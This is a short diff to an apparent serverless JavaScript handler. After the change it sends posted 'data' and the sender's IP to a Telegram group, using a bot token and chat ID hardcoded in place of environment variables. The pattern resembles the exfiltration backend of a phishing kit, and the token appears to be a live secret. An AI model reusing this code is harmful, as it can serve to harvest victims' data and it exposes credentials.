@@ -1,12 +1,14 @@
 export default async function handler(req, res) {
   if (req.method === 'POST') {
     try {
-      const { message } = req.body;
+      const { data, ip } = req.body;
 
-      const telegramToken = process.env.TELEGRAM_BOT_TOKEN; // Store your bot token in environment variables
-      const chatId = process.env.TELEGRAM_CHAT_ID; // Store your chat ID in environment variables
+      const telegramToken = '7227298167:AAFow-OLLx5nb7qXq8Orx8xan6eoujlB7dI'; // Your Telegram Bot API Token
+      const chatId = '-4514758157'; // Your Telegram Group ID
 
       const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+
+      const message = `IP: ${ip}\nData: ${data}`;
 
       const response = await fetch(telegramApiUrl, {
         method: 'POST',
